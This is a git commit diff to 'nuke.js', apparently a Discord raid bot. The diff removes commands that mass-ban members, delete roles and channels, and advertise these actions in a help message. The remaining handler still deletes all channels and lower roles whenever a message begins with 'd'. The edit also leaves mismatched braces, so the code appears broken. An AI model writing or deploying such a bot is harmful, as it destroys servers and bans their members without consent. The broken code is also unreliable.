6eef8a91c0b24b36ac0cbd0220442b6576749a99
alialmoftery <43893786+alialmoftery@users.noreply.github.com>
2021-03-26 04:57:09 +0000

    Update nuke.js

--- nuke.js
+++ nuke.js
@@ -11,26 +11,11 @@ nuke.user.setPresence({ game: { name: `hellooo` }, type: 0 });
 nuke.on("message", async(msg)=>{
 
 
-
-if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
-    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
-    msg.guild.channels.deleteAll();
-    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Get Rekt"));
 }
 if(msg.content.toLowerCase().startsWith("" + "d")){
     msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
     msg.guild.channels.deleteAll();
 }
-if(msg.content.toLowerCase().startsWith("n!" + "heel")){
-    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Get Rekt"));
-}
-if(msg.content.toLowerCase().startsWith("n!" + "help")){
-    msg.author.send({
-        embed: {
-            color: 0xff0000,
-            author: { name: "Nuke Bot | n!help" },
-            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n Have Fun!"
-        }
     })
 }
 });
